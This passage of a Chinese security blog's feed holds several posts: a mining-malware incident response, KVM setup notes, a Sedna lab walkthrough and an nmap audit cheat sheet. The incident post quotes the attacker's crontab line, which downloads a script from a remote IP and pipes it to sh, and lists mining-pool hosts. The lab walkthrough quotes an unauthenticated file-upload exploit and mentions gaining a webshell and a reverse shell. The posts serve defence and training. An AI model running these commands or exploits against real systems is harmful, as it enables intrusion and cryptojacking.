class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vgextend centos  /dev/vda3 /*扩展卷组*/</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/23/Centos7扩容/q6.png" alt="WX20200228-211045|690x97"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vgdisplay /*显示卷组信息*/</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/23/Centos7扩容/q7.png" alt="WX20200228-211223|690x460"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lvextend -l+100%FREE /dev/mapper/centos-root /*扩展逻辑卷*/</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/23/Centos7扩容/q8.png" alt="WX20200228-211256|690x200"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfs_growfs /dev/mapper/centos-root /*对挂载目录进行扩容*/</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/23/Centos7扩容/q9.png" alt="WX20200228-211318|690x276"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df -h</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/23/Centos7扩容/q10.png" alt="image|690x291"><br>步骤是这样的，测试的时候没扩容成功，你们研究这看一下，我觉得总体步骤是没问题的。</p>]]></content>
    
    <summary type="html">
    
      centos7扩容，扩容有风险，操作须谨慎。
    
    </summary>
    
    
      <category term="centos" scheme="https://hexchristmas.github.io/tags/centos/"/>
    
      <category term="扩容" scheme="https://hexchristmas.github.io/tags/%E6%89%A9%E5%AE%B9/"/>
    
  </entry>
  
  <entry>
    <title>一次失败的应急，无法溯源springboot+redis+mongo</title>
    <link href="https://hexchristmas.github.io/2020/02/23/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E5%BA%94%E6%80%A5%EF%BC%8C%E6%97%A0%E6%B3%95%E6%BA%AF%E6%BA%90springboot-redis-mongo/"/>
    <id>https://hexchristmas.github.io/2020/02/23/一次失败的应急，无法溯源springboot-redis-mongo/</id>
    <published>2020-02-23T14:42:23.000Z</published>
    <updated>2020-04-09T11:10:57.501Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一次失败的应急springboot-redis-mongo"><a href="#一次失败的应急springboot-redis-mongo" class="headerlink" title="一次失败的应急springboot+redis+mongo"></a>一次失败的应急springboot+redis+mongo</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>昨个接到消息大概这样，某机构20年2月13号，2月23号，2月28号，3月4号均cpu占用异常高，疑似挖矿木马，通过和网管及其开发人员沟通，应用架构是<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">## 检测</span><br><span class="line">通过架构，我们首先想到可能是redis未授权，又或是mongo未授权，nmap测了一波也未发现，以为是nmap问题，自己又手动测了一波，redis和mongo端口都不是默认的，并且设置了安全访问也就是密钥。</span><br><span class="line"></span><br><span class="line">从zabbix上来看，15天的cpu占用，2月21号到2月23号cpu一直占用170%，在3月4号又出现cpu占用很高。</span><br><span class="line"></span><br><span class="line">发现/var/spool/cron/root计划任务</span><br></pre></td></tr></table></figure></p><p><em>/15 </em> <em> </em> *<br>(/usr/bin/jterfa8||/usr/libexec/jterfa8||/usr/local/bin/jterfa8||/tmp/jterfa8||curl -m180 -fsSL <a href="http://67.207.95.103:8000/i.sh||wget" target="_blank" rel="noopener">http://67.207.95.103:8000/i.sh||wget</a> -q -T180 -O- <a href="http://67.207.95.103:8000/i.sh" target="_blank" rel="noopener">http://67.207.95.103:8000/i.sh</a>) | sh<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">发现/etc/hosts被写了一堆矿池域名</span><br></pre></td></tr></table></figure></p><p> mine.moneropool.com”<br> xmr.crypto-pool.fr”  </p><p> monerohash.com”  </p><p> xmrpool.eu”  </p><p> pool.noobxmr.com”  </p><p> pool.minexmr.cn”  </p><p> xmr.poolto.be”  </p><p> monerohash.com”  </p><p> stratum.viaxmr.com”  </p><p> pool.monero.hashvault.pro”  </p><p> xmr-us.suprnova.cc”  </p><p> de.moriaxmr.com”  </p><p> de2.moriaxmr.com”  </p><p> fr.minexmr.com”  </p><p> de.minexmr.com”  </p><p> ca.minexmr.com”  </p><p> sg.minexmr.com”  </p><p> xmr.bohemianpool.com”  </p><p> xmr-usa.dwarfpool.com”  </p><p> monero.miners.pro”  </p><p> xmr.prohash.net”  </p><p> thyrsi.com”  </p><p> minerxmr.ru”  </p><p> zer0day.ru”  </p><p> minergate.com”  </p><p> pixeldra.in”  </p><p>“220.194.237.43 w.3ei.xyz”  </p><p>“220.194.237.43 w.21-3n.xyz”<br><code>`</code></p><h2 id="清除"><a href="#清除" class="headerlink" title="清除"></a>清除</h2><ol><li>停掉计划任务并清除挖矿计划任务</li><li>清除hosts恶意指向</li></ol><hr><p>其实我们处理的时候就cpu占用就不高了，排查的时候没看到可以进程，无可疑文件，15天内无系统文件被劫持。<br>和网管聊了一下，他们之前有自己处理过，在加上360天擎也杀了一部分，所以有一些细节性的东西就看不到了，应急到这也就只能被迫结束。</p><h2 id="抑制"><a href="#抑制" class="headerlink" title="抑制"></a>抑制</h2><p>没溯源彻底，所以也谈不上抑制，建设性的提了几点：</p><ol><li>不建议redis对公网监听</li><li>不建议redis以root用户启动</li></ol>]]></content>
    
    <summary type="html">
    
      昨个接到消息大概这样，某机构20年2月13号，2月23号，2月28号，3月4号均cpu占用异常高，疑似挖矿木马，通过和网管及其开发人员沟通，应用架构是springboot+redis+mongodb+nginx还有memcache
    
    </summary>
    
    
      <category term="incident response" scheme="https://hexchristmas.github.io/tags/incident-response/"/>
    
  </entry>
  
  <entry>
    <title>Archlinux&amp;Debian安装kvm</title>
    <link href="https://hexchristmas.github.io/2020/02/12/Archlinux-Debian%E5%AE%89%E8%A3%85kvm/"/>
    <id>https://hexchristmas.github.io/2020/02/12/Archlinux-Debian安装kvm/</id>
    <published>2020-02-12T14:47:32.000Z</published>
    <updated>2020-04-09T11:10:57.493Z</updated>
    
    <content type="html"><![CDATA[<h1 id="debian-安装kvm"><a href="#debian-安装kvm" class="headerlink" title="debian 安装kvm"></a>debian 安装kvm</h1><p>因为公司项目要求，所以在鸟上部署了kvm，但是当时部署的没截图，所以只写一下部署过程，大概率不会遇到什么错误。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">egrep &apos;(vmx|svm)&apos; --color=always /proc/cpuinfo /*检查是否开启虚拟化*/</span><br></pre></td></tr></table></figure><p>安装QEMU和KVM及其他组建libvirt什么什么的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu qemu-kvm qemu-system qemu-utils libvirt-clients libvirt-daemon-system virtinst virt-manager bridge-utils libguestfs-tools libosinfo-bin</span><br></pre></td></tr></table></figure></p><p>将当前用户添加到libvirt libvirt-qume组中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -a -G libvirt user</span><br><span class="line">sudo usermod -a -G libvirt-qume</span><br></pre></td></tr></table></figure></p><p>到这其实已经部署完成。</p><h2 id="常用的命令"><a href="#常用的命令" class="headerlink" title="常用的命令"></a>常用的命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">virsh list  /*在线VM*/</span><br><span class="line">virsh list --all  /*所有VM*/</span><br><span class="line">virsh start /*开机*/</span><br><span class="line">virsh shutdown  /*软关机*/</span><br><span class="line">virsh destroy /*强制关机*/</span><br><span class="line">virsh dnmpxml vm_name &gt; name.xml  /*配置备份，xml配置文件路径  /etc/libvirt/qemu */</span><br><span class="line">virsh undefine  /*删除vm，只是删除配置文件*/</span><br><span class="line">virsh define name.xml /*导入备份的xml配置*/</span><br><span class="line">virsh edit vm_name  /*修改配置文件，带语法检查*/</span><br><span class="line">virsh domrename oldname newname   /*重命名，在关机状态修改*/</span><br><span class="line">virsh suspend   /*挂起，状态paused*/</span><br><span class="line">virsh resume    /*解除挂起*/</span><br><span class="line">virsh vncdisplayer    /*查看vnc端口号*/</span><br><span class="line">virsh autostart name    /*开机自启动，原理配置软连接实现*/</span><br><span class="line">virsh autostart --disable name    /*取消开机启动*/</span><br><span class="line">virsh console name    /*#ctrl + ] 切换退出，可不通过网络，底层console连接*/</span><br><span class="line">brctl show    /*查看桥接网路*/</span><br><span class="line">virsh domiflist VM1   /*查看VM1网卡*/</span><br><span class="line">qemu-img info   /*查看磁盘信息*/</span><br><span class="line">qemu-img convert -f raw -O qcow2 name.raw name.qcow   /*转换格式,支持vmdk*/</span><br><span class="line">virsh snapshot-create   /*快照*/</span><br><span class="line">virsh snapshot-list   /*快照列表,快照直接放在虚拟磁盘中*/</span><br><span class="line">virsh snapshot-delete vmname --snapshotname   /*删除快照，删除快照文件不会变小*/</span><br><span class="line">virsh snapshot-revert vmname    /*还原快照*/</span><br></pre></td></tr></table></figure><h2 id="如何创建一个虚拟机？"><a href="#如何创建一个虚拟机？" class="headerlink" title="如何创建一个虚拟机？"></a>如何创建一个虚拟机？</h2><h3 id="直接用命令创建"><a href="#直接用命令创建" class="headerlink" title="直接用命令创建"></a>直接用命令创建</h3><p>创建磁盘映像：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-img create -f qcow2 -o size=35G,preallocation=&quot;metadata&quot; /kvm/windows7\ test1/wintest1.qcow2</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">virt-install -n wintest1 \</span><br><span class="line">&gt; -r 1536 --vcpus=1 \</span><br><span class="line">&gt; -c /kvm/iso/cn_windows_7_professional_with_sp1_vl_build_x86_dvd_u_677939.iso \</span><br><span class="line">&gt; --os-type=windows \ #设定操作系统标签</span><br><span class="line">&gt; --disk path=/kvm/windows7 \ test1/wintest1.qcow2,device=disk,bus=sata,size=35,format=qcow2 \</span><br><span class="line">&gt; --network network=default</span><br></pre></td></tr></table></figure><p>这里边参数大概是这样：<br>-n 虚拟机名称<br>-r 向外映射的端口<br>-c 镜像端口<br>–os-type 你安装的镜像类型和vmware类似<br>–disk path 你的磁盘位置<br>–network network=default 网络，默认是nat<br>这里还涉及到一些很细节的参数，安装想不起来了，想起来再来补充，这是安装win7的，安装linux的也一样，举一反三，懂吧？</p><h3 id="用virt-manager"><a href="#用virt-manager" class="headerlink" title="用virt-manager"></a>用virt-manager</h3><p>用图形化就比较简单了，点点点，你们自己去发掘。<br><img src="/2020/02/12/Archlinux-Debian安装kvm/a.png" alt="kvm-qemu|626x500"> </p><hr><p>用命令创建需要啪啦啪啦敲一堆命令，推荐图形化简单一点。<br>其实这里还涉及到了kvm的网络配置，那块我还没研究，后续再来补充。</p><hr><h1 id="今天建kvm时候发现了一个很恶心的问题，"><a href="#今天建kvm时候发现了一个很恶心的问题，" class="headerlink" title="今天建kvm时候发现了一个很恶心的问题，"></a>今天建kvm时候发现了一个很恶心的问题，</h1><h2 id="error"><a href="#error" class="headerlink" title="error:"></a>error:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KVM cannot access storage file (as uid:107, gid:107)permission denied</span><br></pre></td></tr></table></figure><p><img src="/2020/02/12/Archlinux-Debian安装kvm/b.png" alt="2020-03-05_15-32|509x500"> </p><h2 id="slove"><a href="#slove" class="headerlink" title="slove"></a>slove</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/libvirt/qemu.conf</span><br></pre></td></tr></table></figure><p>将<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![image|548x500](c.jpeg)</span><br></pre></td></tr></table></figure></p><p>sudo systemctl restart libvirt<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![2020-03-05_15-32_1|690x444](d.png)</span><br><span class="line"># 如何将vmdk转qcow2？</span><br></pre></td></tr></table></figure></p><p>qemu-img convert -f vmdk -O qcow2  xxx.vmdk xxx.qcow2<br><code>`</code></p>]]></content>
    
    <summary type="html">
    
      因为公司项目要求，所以在debian和arch上部署了kvm，但是当时部署的没截图，所以只写一下部署过程，大概率不会遇到什么错误。
    
    </summary>
    
    
      <category term="Archlinux" scheme="https://hexchristmas.github.io/tags/Archlinux/"/>
    
      <category term="Debian" scheme="https://hexchristmas.github.io/tags/Debian/"/>
    
      <category term="kvm" scheme="https://hexchristmas.github.io/tags/kvm/"/>
    
  </entry>
  
  <entry>
    <title>Sedna靶场</title>
    <link href="https://hexchristmas.github.io/2019/12/13/Sedna%E9%9D%B6%E5%9C%BA/"/>
    <id>https://hexchristmas.github.io/2019/12/13/Sedna靶场/</id>
    <published>2019-12-13T15:00:15.000Z</published>
    <updated>2020-04-09T11:10:57.497Z</updated>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p><img src="/2019/12/13/Sedna靶场/w1.png" alt="%E5%9B%BE%E7%89%87%201|690x423"> </p><h3 id="开放端口："><a href="#开放端口：" class="headerlink" title="开放端口："></a>开放端口：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">22 53 80 110 111 139 143 445 993 995 8080</span><br></pre></td></tr></table></figure><h3 id="开放服务："><a href="#开放服务：" class="headerlink" title="开放服务："></a>开放服务：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">OpenSSH 6.6.1p1  </span><br><span class="line">ISC BIND 9.9.5-3</span><br><span class="line">Apache httpd 2.4.7 Dovecot pop3d</span><br><span class="line">Samba smbd 3.X - 4.X ssl/imaps?</span><br><span class="line">Apache Tomcat7/Coyote JSP engine 1.1</span><br></pre></td></tr></table></figure><h3 id="暴力目录探测"><a href="#暴力目录探测" class="headerlink" title="暴力目录探测"></a>暴力目录探测</h3><table><thead><tr><th>links</th></tr></thead><tbody><tr><td> <a href="http://192.168.88.134/blocks/" target="_blank" rel="noopener">http://192.168.88.134/blocks/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/files/" target="_blank" rel="noopener">http://192.168.88.134/files/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/index.html" target="_blank" rel="noopener">http://192.168.88.134/index.html</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/modules/" target="_blank" rel="noopener">http://192.168.88.134/modules/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/robots.txt" target="_blank" rel="noopener">http://192.168.88.134/robots.txt</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/server" target="_blank" rel="noopener">http://192.168.88.134/server</a></td><td></td><td></td></tr><tr><td> <a href="http://192.168.88.134/license.txt" target="_blank" rel="noopener">http://192.168.88.134/license.txt</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/" target="_blank" rel="noopener">http://192.168.88.134/system/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/themes/" target="_blank" rel="noopener">http://192.168.88.134/themes/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/modules/" target="_blank" rel="noopener">http://192.168.88.134/modules/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/" target="_blank" rel="noopener">http://192.168.88.134/system/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/core/" target="_blank" rel="noopener">http://192.168.88.134/system/core/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/database/" target="_blank" rel="noopener">http://192.168.88.134/system/database/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/fonts/" target="_blank" rel="noopener">http://192.168.88.134/system/fonts/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/helpers/" target="_blank" rel="noopener">http://192.168.88.134/system/helpers/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/index.html</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/language/" target="_blank" rel="noopener">http://192.168.88.134/system/language/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/libraries/" target="_blank" rel="noopener">http://192.168.88.134/system/libraries/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/themes/" target="_blank" rel="noopener">http://192.168.88.134/themes/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/core/" target="_blank" rel="noopener">http://192.168.88.134/system/core/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/core/compat/" target="_blank" rel="noopener">http://192.168.88.134/system/core/compat/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/core/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/core/index.html</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/database/" target="_blank" rel="noopener">http://192.168.88.134/system/database/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/database/drivers/" target="_blank" rel="noopener">http://192.168.88.134/system/database/drivers/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/database/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/database/index.html</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/fonts/" target="_blank" rel="noopener">http://192.168.88.134/system/fonts/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/fonts/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/fonts/index.html</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/helpers/" target="_blank" rel="noopener">http://192.168.88.134/system/helpers/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/helpers/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/helpers/index.html</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/language/" target="_blank" rel="noopener">http://192.168.88.134/system/language/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/language/english/" target="_blank" rel="noopener">http://192.168.88.134/system/language/english/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/language/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/language/index.html</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/libraries/" target="_blank" rel="noopener">http://192.168.88.134/system/libraries/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/libraries/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/libraries/index.html</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/core/compat/" target="_blank" rel="noopener">http://192.168.88.134/system/core/compat/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/core/compat/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/core/compat/index.html</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/database/drivers/" target="_blank" rel="noopener">http://192.168.88.134/system/database/drivers/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/database/drivers/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/database/drivers/index.html</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/database/drivers/mssql/" target="_blank" rel="noopener">http://192.168.88.134/system/database/drivers/mssql/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/database/drivers/mysql/" target="_blank" rel="noopener">http://192.168.88.134/system/database/drivers/mysql/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/database/drivers/odbc/" target="_blank" rel="noopener">http://192.168.88.134/system/database/drivers/odbc/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/language/english/" target="_blank" rel="noopener">http://192.168.88.134/system/language/english/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/language/english/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/language/english/index.html</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/database/drivers/mssql/" target="_blank" rel="noopener">http://192.168.88.134/system/database/drivers/mssql/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/database/drivers/mssql/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/database/drivers/mssql/index.html</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/database/drivers/mysql/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/database/drivers/mysql/index.html</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/database/drivers/odbc/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/database/drivers/odbc/index.html</a></td><td></td><td></td></tr></tbody></table><h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>根据nmap扫描出来的端口和服务看了看貌似没啥能利用的漏洞，看一下dirb都爬到了什么信息，全部看完，发现没什么思路，又仔细看了第二遍，发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.88.134/license.txt</span><br></pre></td></tr></table></figure></p><p>这个地方<br><img src="/2019/12/13/Sedna靶场/w2.png" alt="2|690x316"><br>看到Radian Enterprise，Enterprise貌似是企业的意思，放到google里搜索一圈，</p><p>看到Radian Enterprise，Enterprise貌似是企业的意思，放到google里搜索一圈，<br><img src="/2019/12/13/Sedna靶场/w3.png" alt="3|690x386"> </p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="初步利用"><a href="#初步利用" class="headerlink" title="初步利用"></a>初步利用</h2><p> 谷歌告诉我们这个的确存在漏洞，漏洞大概在BuilderEngine任意文件上传，<br>查看exploit-db，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1) Unauthenticated Unrestricted File Upload:</span><br><span class="line">POST /themes/dashboard/assets/plugins/jquery-file-upload/server/php/</span><br><span class="line">Vulnerable Parameter: files[]</span><br><span class="line">We can upload test.php and reach the file via the following link:</span><br><span class="line">/files/test.php--&gt;&lt;html&gt;&lt;body&gt;&lt;form method=&quot;post&quot; action=&quot;http://localhost/themes/dashboard/assets/plugins/jquery-file-upload/server/php/&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;files[]&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;send&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>告诉我们，要我们把下面的代码以post方式传上去<br><img src="/2019/12/13/Sedna靶场/w4.png" alt="4|690x386"> </p><p>用蚁剑连接shell<br><img src="/2019/12/13/Sedna靶场/w5.png" alt="5|690x450"> </p><p>查看第一个<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![6|690x456](w6.png) </span><br><span class="line"></span><br><span class="line">## 深度利用</span><br><span class="line">深入，我们发现我们的用户是www-data权限，我们cat /etc/os-release发现这个系统是ubuntu14.04.1，其实我们</span><br></pre></td></tr></table></figure></p><p>NAME=”Ubuntu”<br>VERSION=”14.04.1 LTS, Trusty Tahr”<br>ID=ubuntu<br>ID_LIKE=debian<br>PRETTY_NAME=”Ubuntu 14.04.1 LTS”<br>VERSION_ID=”14.04”<br>HOME_URL=”<a href="http://www.ubuntu.com/&quot;" target="_blank" rel="noopener">http://www.ubuntu.com/&quot;</a><br>SUPPORT_URL=”<a href="http://help.ubuntu.com/&quot;" target="_blank" rel="noopener">http://help.ubuntu.com/&quot;</a><br>BUG_REPORT_URL=<a href="http://bugs.launchpad.net/ubuntu/" target="_blank" rel="noopener">http://bugs.launchpad.net/ubuntu/</a><br><code>`</code><br><img src="/2019/12/13/Sedna靶场/w7.png" alt="7|690x382"><br>通过seachsploit搜索相关exploit，发现可用的有脏牛，还有一个内核提权的漏洞，我们上船之后，发现编译执行无法提权，<br>我们根据我们之前nmap出的信息，openssh版本太高没啥可利用的漏洞，<br>脏牛，我们发现一祭出脏牛，吧唧就崩溃了，<br>apache2.4.7貌似有一个信息泄漏，我们要的是拿flag提权对吧，也没啥用，不关注了<br>Apachetomcat7，有一个cve-2016-1240本地提权的，exp传上去发现明明存在comcat7但是就是提不了权，继续看<br>我们继续google，发现可以用chkrootkit0.49提权，反弹shell监听msf利用拿flag<br><img src="/2019/12/13/Sedna靶场/w8.png" alt="8|690x470"></p>]]></content>
    
    <summary type="html">
    
      这段时间自己练了一些靶场
    
    </summary>
    
    
      <category term="exploit" scheme="https://hexchristmas.github.io/tags/exploit/"/>
    
      <category term="vulnerablility" scheme="https://hexchristmas.github.io/tags/vulnerablility/"/>
    
  </entry>
  
  <entry>
    <title>nmap高级用法</title>
    <link href="https://hexchristmas.github.io/2019/09/15/nmap%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95/"/>
    <id>https://hexchristmas.github.io/2019/09/15/nmap高级用法/</id>
    <published>2019-09-15T14:41:02.000Z</published>
    <updated>2020-04-09T11:10:57.497Z</updated>
    
    <content type="html"><![CDATA[<p>前两天在做等保中的漏洞复测，用的nmap脚本比较多，今天刚好闲下来，把nmap脚本用法简单写一下</p><h1 id="简单的给大家过一下，基本操作哈。"><a href="#简单的给大家过一下，基本操作哈。" class="headerlink" title="简单的给大家过一下，基本操作哈。"></a>简单的给大家过一下，基本操作哈。</h1><p>比如说，我们要进行对icmp的扫描,我们可以这样写：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP ipaddress</span><br></pre></td></tr></table></figure></p><p>我们要对目标半开放式端口扫描不想在留下日志记录怎么整？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namp -sS -p port ipadress</span><br></pre></td></tr></table></figure></p><h1 id="下面介绍一些nmap的审计脚本"><a href="#下面介绍一些nmap的审计脚本" class="headerlink" title="下面介绍一些nmap的审计脚本"></a>下面介绍一些nmap的审计脚本</h1><p>snmp默认团体名/弱口令漏洞及安全加固<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –sU –p161 –script=snmp-brute ipaddress 审计snmp弱口令</span><br></pre></td></tr></table></figure></p><p>iis短文件名泄露<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80 --script http-iis-short-name-brute ipaddress</span><br></pre></td></tr></table></figure></p><p>Memcached未授权访问漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p 11211 -script memcached-info ipaddress</span><br></pre></td></tr></table></figure></p><p>验证https.sys远程代码执行漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV - (-) script http-vuln-cve2015-1635 ipaddress</span><br></pre></td></tr></table></figure></p><p>心脏出血<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --scipt=ssl-heartbleed ipaddress</span><br></pre></td></tr></table></figure></p><p>mongodb未授权访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 27017 --script mongodb-info ipaddress</span><br></pre></td></tr></table></figure></p><p>redis未授权访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 6370 --script redis-info ipaddress</span><br></pre></td></tr></table></figure></p><p>elastticsearch未授权访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=http-vuln-cve2015-1427 --script-args command=&apos;ls&apos; 